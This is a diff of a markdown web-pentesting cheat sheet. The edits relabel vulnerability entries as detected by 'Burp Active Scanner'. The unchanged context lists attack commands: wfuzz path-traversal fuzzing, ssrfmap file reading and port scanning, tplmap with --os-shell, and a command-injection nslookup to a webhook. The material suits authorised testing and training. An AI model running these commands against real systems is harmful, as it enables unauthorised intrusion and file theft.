@@ -54,7 +54,7 @@ original_cmd_by_server;nslookup+<webhook>
 crlfuzz -u <url>
 ```
 - 🔴 __Dangling Markup__
-- 🔴 __File Inclusion/Path Traversal__ (Detected by 👉 Burp Scanner)
+- 🔴 __File Inclusion/Path Traversal__ (Detected by 👉 Burp Active Scanner)
 ```
 // Fast Fuzzing
 wfuzz -c -w /usr/share/wfuzz/wordlist/Injections/Traversal.txt --hw 0 http://10.10.10.10/nav.php?page=FUZZ
@@ -62,9 +62,9 @@ wfuzz -c -w /usr/share/wfuzz/wordlist/Injections/Traversal.txt --hw 0 http://10.
 wfuzz -X GET -c -w file_inclusion_linux.txt --hw 0 http://10.10.10.10/nav.php?page=FUZZ
 wfuzz -X POST -c -w file_inclusion_linux.txt --hw 0 -d "foo=FUZZ" http://10.10.10.10/nav.php
 ```
-- 🔴 __Open Redirect__ (Detected by 👉 Burp Scanner)
+- 🔴 __Open Redirect__ (Detected by 👉 Burp Active Scanner)
 - 🔴 __Prototype Pollution to XSS__ (NodeJS)
-- 🔴 __Server Side Inclusion/Edge Side Inclusion__ (Detected by 👉 Burp Scanner)
+- 🔴 __Server Side Inclusion/Edge Side Inclusion__ (Detected by 👉 Burp Active Scanner)
 - 🔴 __Server Side Request Forgery__
 ```
 // Tool See-SURF (Test vulnerable parameter)
@@ -76,12 +76,12 @@ python3 ssrfmap.py -r <REQFILE> -p <PARAM> -m readfiles,portscan
 // Tool Gopherus (SSRF to RCE)
 https://github.com/tarunkant/Gopherus
 ```
-- 🔴 __Server Side Template Injection__ (Detected by 👉 Burp Scanner)
+- 🔴 __Server Side Template Injection__ (Detected by 👉 Burp Active Scanner)
 ```
 // Tool tplmap
 python2 tplmap.py -u 'http://10.10.10.10/page?name=Box*' --os-shell
 ```
-- 🔴 __Reverse Tab Nabbing__
+- 🔴 __Reverse Tab Nabbing__ (Detected by 👉 Burp Extension - Discover Reverse Tabnabbing)
 - 🔴 __XSLT Server Side Injection__
 - 🔴 __XSS__
 - 🔴 __XSSI__
